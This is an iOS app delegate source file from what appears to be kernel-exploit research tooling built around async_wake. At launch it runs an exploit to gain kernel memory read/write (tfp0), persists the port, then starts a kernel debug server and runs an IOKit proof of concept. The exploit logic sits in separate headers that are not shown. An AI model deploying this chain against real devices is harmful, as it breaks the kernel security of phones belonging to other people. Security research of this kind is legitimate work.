#import "AppDelegate.h"

#include <mach/mach.h>

#include "async_wake.h"
#include "symbols.h"
#include "persist_tfp0.h"
#include "kdp_server.h"
#include "kernel_debug_me.h"
#include "kmem.h"
#include "kdbg.h"


@interface AppDelegate ()

@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
  // Override point for customization after application launch.

  offsets_init();

  mach_port_t tfp0 = try_restore_port();
  if (tfp0 == MACH_PORT_NULL) {
    tfp0 = get_kernel_memory_rw();
    persist_port(tfp0);
    printf("aync_wake success, please exit now and run again for the next exploit\n");
    return YES;
  } else {
    prepare_rwk_via_tfp0(tfp0);
  }
  printf("tfp0: %x\n", tfp0);

  if (probably_have_correct_symbols()) {
    printf("starting kdp server\n");
    start_kdp_server();
    
    // run the iokit PoC to test under kdp:
    kernel_debug_me();
  } else {
    printf("the debugger probably won't work, couldn't find any symbols\n");
  }
  return YES;
}


- (void)applicationWillResignActive:(UIApplication *)application {
  // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
  // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
}


- (void)applicationDidEnterBackground:(UIApplication *)application {
  // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
  // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
}


- (void)applicationWillEnterForeground:(UIApplication *)application {
  // Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
}


- (void)applicationDidBecomeActive:(UIApplication *)application {
  // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
}


- (void)applicationWillTerminate:(UIApplication *)application {
  // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
}


@end
